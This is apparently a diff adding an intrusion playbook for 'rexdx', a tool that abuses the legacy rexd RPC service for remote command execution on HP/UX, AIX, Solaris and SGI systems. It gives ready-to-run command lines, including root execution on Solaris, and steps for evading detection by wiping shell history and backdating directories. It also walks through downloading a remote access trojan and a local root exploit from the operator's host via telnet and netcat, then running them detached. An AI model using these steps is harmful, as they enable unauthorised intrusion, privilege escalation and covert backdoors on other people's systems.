@@ -1,0 +1,243 @@
+###### Start of REXDX rexdx scripting...
+## % rexdx
+## ++++++++++++++++++++++++++++++++++++++++++++++++++
+## rexdx:  parameters being used...
+##         [-P] target_path.....<PATH=/bin:/usr/bin:/sbin:/usr/sbin>
+##         [-u] user_id.........1
+##         [-g] group_id........1
+##         [-i] ip_address......<NULL>
+##         [-h] host_name.......<NULL>
+##         [-l] listen_port.....0
+##         [-p] rexd_port.......0
+##         [-c] command_string..<NULL>
+##         [-s] shell_string....<NULL>
+##         [-d] delay_seconds...5
+## ++++++++++++++++++++++++++++++++++++++++++++++++++
+## BONK!!! No ip_address (-i option) specified!
+## BONK!!! No host_name (-h option) specified!
+## BONK!!! No command_string (-c option) specified!
+## BONK!!! No listen_port (-l option) specified!
+## usage: rexdx -P target_path -u uid -n gid -i remoteIP \
+##              -i remoteIP -h remoteHostname \
+##              -l listenPort -p rexdPort -d delaySeconds \
+##              -c commandString -s shellString
+## %
+
+## The touch...
+# ./rpc_p -t REMOTEIP
+   program vers proto   port  service
+--> 100017    1   tcp  32772  rexd
+
+## Notes from some "rexd/rpc.rexd" testing...
+## 
+## 1.  You gotta get the hostname right.  If not, the "rex" daemon will
+##     attempt to mount your "rex" directory using "mountd", instead of
+##     believing your "rex" directory is local, and then "chdir" into it.
+##     Symptom is a bounced attempt, and either (1) one returned data packet 
+##     from the host, saying something clever like...
+## 
+##     rexd: <hostname> not running a mount daemon
+##     translation --> the <hostname> you shipped does not equate to what it thinks
+##                     its current hostname is, but it does appear in its hostname
+##                     database...so your target tried to mount the "rex" directory
+##                     from the <hostname> you shipped
+## 
+##     rexd: mount <hostname>:/: <hostname> not in hosts database....
+##     translation --> the <hostname> you shipped does not equate to what it thinks
+##                     its current hostname is, and it does not appear in its hostname
+##                     database
+## 
+##     ...or (2) a fairly immediate TCP FIN from the target.
+## 
+##     If you end up getting a mount attempt issued inadvertently on your
+##     behalf by "rexd", you may also end up with a "temporary" (which stays
+##     around for life) directory named...
+## 
+##     HP/UX --------> /var/spool/rexd
+##     IBM AIX & Solaris 2.X --> /tmp_rex
+##     SGI ----------> /var/tmp_rex
+## 
+##     ...oh, yeah:  the mount attempt may also get logged.
+## 
+## 2.  Don't blow the command, please.  You'll receive a...
+## 
+##     rexd: can't exec <command>
+## 
+## 3.  Some implementations have a command line option on "rexd" to require
+##     DES authentication, which means no joy for us.  If they do, you'll get
+##     a response something like...
+## 
+##     call failed: RPC: Authentication error; why = Client credential too weak
+## 
+## HP/UX...
+## IBM AIX...
+## SCO...
+## SGI...
+##   All these guys specifically _deny_ "root" user remote execution...
+##
+##   rexd: root execution not allowed
+## 
+##   ...so, remember, don't do rooty things on them via "rexd".
+##   
+## HP/UX, SGI & SCO also log it, ala...
+##   Feb  2 17:00:20 3E:target rexd[1955]: root execution from 123.123.123.123 not allowed
+## 
+## Solaris 2.X allows "root" (0:0) execution just fine...gold!
+## 
+## NOTE **** If they're running "rpc.rexd -r", and our userid is _not_
+##      **** valid...
+##
+## 1.  We'll see...
+##     
+##     rlt_stat:1 (0x1)
+##     rlt_message:rexd: User id 18888 not valid
+##     
+##     Bailing...
+##
+## 2.  If they're logging via "rpc.rexd -l logfile" also, a bogus
+##     userid will be logged as something nice like...
+##     
+##     02.13 09:02:01  hostname   pid=20477  rpc.rexd
+##          rexd: User id 18888 not valid
+
+## HP/UX ## ## REXDX...as "daemon:daemon", "1:5" on HP/UX...
+## HP/UX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## HP/UX ##   -u 1 -g 5 -c "/bin/sh -c" -s "date; id; uname -a; w; ps -ef"
+## HP/UX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## HP/UX ##   -u 1 -g 5 -c "/bin/sh -c" -s "cat /etc/syslog.conf"
+## HP/UX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## HP/UX ##   -u 1 -g 5 \
+## HP/UX ##   -c "/bin/sh -c" -s "tail -100 /var/adm/syslog/syslog.log"
+## HP/UX ##   
+## HP/UX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## HP/UX ##   -u 1 -g 5   -c "/bin/sh -i"
+
+## IBM AIX ## REXDX...as "daemon:daemon", "1:1" on IBM AIX...
+## IBM AIX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## IBM AIX ##	-u 1 -g 1 -c "/bin/sh -c" -s "date; id; uname -a; w; ps -ef"
+## IBM AIX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## IBM AIX ##	-u 1 -g 1 -c "/bin/sh -c" -s "cat /etc/syslog.conf"
+## IBM AIX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## IBM AIX ##	-u 1 -g 1 \
+## IBM AIX ##	-c "/bin/sh -c" -s "tail -100 /var/adm/messages"
+## IBM AIX ##
+## IBM AIX ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## IBM AIX ##	-u 1 -g 1   -c "/bin/sh -i"
+
+## Solaris 2.X ## ## REXDX...as "root:root", "0:0" on Solaris 2.X...
+## Solaris 2.X ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## Solaris 2.X ##   -u 0 -g 0 -c "/bin/sh -c" -s "date; id; uname -a; w; ps -ef"
+## Solaris 2.X ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## Solaris 2.X ##   -u 0 -g 0 -c "/bin/sh -c" -s "cat /etc/syslog.conf"
+## Solaris 2.X ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## Solaris 2.X ##   -u 0 -g 0 \
+## Solaris 2.X ##   -c "/bin/sh -c" -s "tail -100 /var/adm/messages"
+## Solaris 2.X ##   
+## Solaris 2.X ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## Solaris 2.X ##    -u 0 -g 0 -c "/bin/sh -i"
+
+## SGI ## ## REXDX...as "daemon:daemon", "1:1" on SGI...
+## SGI ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## SGI ##   -u 1 -g 1 -c "/bin/sh -c" -s "date; id; uname -a; w; ps -ef"
+## SGI ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## SGI ##   -u 1 -g 1 -c "/bin/sh -c" -s "cat /etc/syslog.conf"
+## SGI ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## SGI ##   -u 1 -g 1 \
+## SGI ##   -c "/bin/sh -c" -s "tail -100 /var/adm/SYSLOG"
+## SGI ##   
+## SGI ## rexdx -i REMOTEIP -h HOSTNAME -p REMOTEPORT -l 32177 \
+## SGI ##    -u 1 -g 1 -c "/bin/sh -i"
+
+## For shell...(daemon gets "/sbin/sh" or "/bin/sh" on a true login)...
+set
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+#### if (you need a local...i.e. you didn't get "root") then
+    ## 1. Set up our local RAT netcat
+    ## 2. Telnet back to upload the RAT, fire it up
+    ## 3. Connect to "daemon" nosy
+    ## 4. Set up our local LOCALXP netcat
+    ## 5. Upload appropriate local
+    ## 6. Run appropriate local
+    ## 7. You be "root"...
+
+    ## "RAT" upload ## ## Netcat...
+    ## "RAT" upload ## cd ../up
+    ## "RAT" upload ## cp RAT_EXECUTABLE ALIAS; compress ALIAS
+    ## "RAT" upload ## uuencode ALIAS.Z ALIAS.Z > ALIAS.uu
+    ## "RAT" upload ## ls -l ALIAS*
+    ## "RAT" upload ## nc -l -p NETCATPORT < ALIAS.uu
+
+    ## Go fetch and fire up our RAT...
+    mkdir WORKINGDIR; chmod 700 WORKINGDIR
+    cd WORKINGDIR
+    telnet LOCALIP NETCATPORT > ALIAS.uu
+    uudecode ALIAS.uu && uncompress ALIAS.Z && chmod 700 ALIAS; ls -la
+    0<&- 1<&- 2<&- PATH=. ALIAS
+
+    ## LOCAL upload ## ## Netcat...
+    ## LOCAL upload ## cd ../up
+    ## LOCAL upload ## cp LOCALXP LOCALALIAS; compress LOCALALIAS; 
+    ## LOCAL upload ## uuencode LOCALALIAS.Z LOCALALIAS.Z > LOCALALIAS.uu
+    ## LOCAL upload ## ls -l LOCALALIAS*
+    ## LOCAL upload ## nc -l -p NETCATPORT < LOCALALIAS.uu
+
+    ## "local" upload & execution...
+    cd WORKINGDIR; telnet LOCALIP NETCATPORT > LOCALALIAS.uu
+    uudecode LOCALALIAS.uu; uncompress LOCALALIAS.Z; ls -la
+    LOCALALIAS
+    
+    ## GOT ROOT?
+    ## Bag any shell history...
+    unset HISTFILE
+    unset HISTFILESIZE
+    unset HISTSIZE
+
+    ## Manufacture our working directory...
+    ls -la /tmp
+    mkdir WORKINGDIR
+    chown -R root:root WORKINGDIR; chmod -R og-rwx WORKINGDIR; ls -al
+	
+    ## Make its time look a bit more convincing...
+    touch -r SOMEDIRECTORY WORKINGDIR; ls -la /tmp
+
+    ## RAT's already here, fire it off as "root"...
+    cd WORKINGDIR
+    0<&- 1<&- 2<&- PATH=. P=RATPORT ALIAS
+    rm ALIAS ALIAS.uu; ls -la
+#### else
+    ## GOT ROOT?
+    ## Bag any shell history...
+    unset HISTFILE
+    unset HISTFILESIZE
+    unset HISTSIZE
+
+    ## Manufacture our working directory...
+    ls -la /tmp
+    mkdir WORKINGDIR
+    chown -R root:root WORKINGDIR; chmod -R og-rwx WORKINGDIR; ls -al
+
+    ## Make its time look a bit more convincing...
+    touch -r SOMEDIRECTORY WORKINGDIR; ls -la /tmp
+
+    ## "RAT" upload ## ## Netcat...
+    ## "RAT" upload ## cd ../up
+    ## "RAT" upload ## cp RAT_EXECUTABLE ALIAS; compress ALIAS; 
+    ## "RAT" upload ## uuencode ALIAS.Z ALIAS.Z > ALIAS.uu
+    ## "RAT" upload ## ls -l ALIAS*
+    ## "RAT" upload ## nc -l -p NETCATPORT < ALIAS.uu
+
+    ## Go fetch and fire up our RAT...
+    cd WORKINGDIR
+    telnet LOCALIP NETCATPORT > ALIAS.uu
+    uudecode ALIAS.uu && uncompress ALIAS.Z && chmod 700 ALIAS; ls -la
+    0<&- 1<&- 2<&- PATH=. ALIAS
+    rm ALIAS ALIAS.uu; ls -la
+####
+
+## Once we have our RAT up and connected, get outta Dodge, and use the RAT...
+exit 0
+
+###### End of REXDX rexdx scripting...
